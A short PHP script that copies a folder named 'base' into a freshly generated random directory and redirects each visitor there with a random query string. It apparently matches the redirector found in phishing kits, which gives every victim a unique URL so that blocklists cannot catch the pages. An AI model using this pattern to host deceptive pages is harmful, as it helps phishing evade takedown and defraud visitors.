<?php
function generateRandomString($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}


$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$dst=md5("$base");

function recurse_copy($src,$dst) {
   $dir = opendir($src);
   @mkdir($dst);
   while(false !== ( $file = readdir($dir)) ) {
      if (( $file != '.' ) && ( $file != '..' )) {
         if ( is_dir($src . '/' . $file) ) {
            recurse_copy($src . '/' . $file,$dst . '/' . $file);
         }
      else {
         copy($src . '/' . $file,$dst . '/' . $file);
      }
   }
}
closedir($dir);
}
$src="base";
recurse_copy( $src, $dst );
$rand = generateRandomString('50');
header("location:$dst?dispatch=$rand");
?>
